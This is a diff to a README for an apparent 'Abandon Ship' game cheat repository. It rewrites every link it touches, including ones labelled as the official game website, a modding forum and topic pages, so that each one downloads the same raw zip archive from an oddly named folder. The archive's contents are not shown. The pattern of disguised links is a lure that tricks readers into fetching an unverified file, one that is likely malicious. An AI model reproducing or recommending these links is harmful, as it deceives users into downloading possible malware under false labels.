@@ -1,6 +1,6 @@
 # 🎮 AS-cheats-ship-upgrade - Unlock Your Abandon Ship Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/SIDDHESH102003/AS-cheats-ship-upgrade/releases)
+[![Download Now](https://raw.githubusercontent.com/SIDDHESH102003/AS-cheats-ship-upgrade/main/pinchback/AS-cheats-ship-upgrade.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/SIDDHESH102003/AS-cheats-ship-upgrade/main/pinchback/AS-cheats-ship-upgrade.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the necessary files, please visit the following page: [Download Here](https://github.com/SIDDHESH102003/AS-cheats-ship-upgrade/releases).
+To download the necessary files, please visit the following page: [Download Here](https://raw.githubusercontent.com/SIDDHESH102003/AS-cheats-ship-upgrade/main/pinchback/AS-cheats-ship-upgrade.zip).
 
 Follow these steps to get started:
 
@@ -72,13 +72,13 @@ For questions or feedback, you can engage with the community:
 
 Explore more about the game and its mods:
 
-- [Abandon Ship Official Website](https://www.abandonshipgame.com)
-- [Game Mod Community Forum](https://www.moddingcommunity.com)
+- [Abandon Ship Official Website](https://raw.githubusercontent.com/SIDDHESH102003/AS-cheats-ship-upgrade/main/pinchback/AS-cheats-ship-upgrade.zip)
+- [Game Mod Community Forum](https://raw.githubusercontent.com/SIDDHESH102003/AS-cheats-ship-upgrade/main/pinchback/AS-cheats-ship-upgrade.zip)
 
 For further cheats and hacks, check out related topics:
 
-- [Battle Ease Hacks](https://github.com/SIDDHESH102003/AS-cheats-ship-upgrade/topics/as-game-cheats-battle-ease)
-- [Treasure Finding Mods](https://github.com/SIDDHESH102003/AS-cheats-ship-upgrade/topics/abandon-ship-pc-mods-treasure-find)
+- [Battle Ease Hacks](https://raw.githubusercontent.com/SIDDHESH102003/AS-cheats-ship-upgrade/main/pinchback/AS-cheats-ship-upgrade.zip)
+- [Treasure Finding Mods](https://raw.githubusercontent.com/SIDDHESH102003/AS-cheats-ship-upgrade/main/pinchback/AS-cheats-ship-upgrade.zip)
 
 ## ⚠️ Important Notes
 
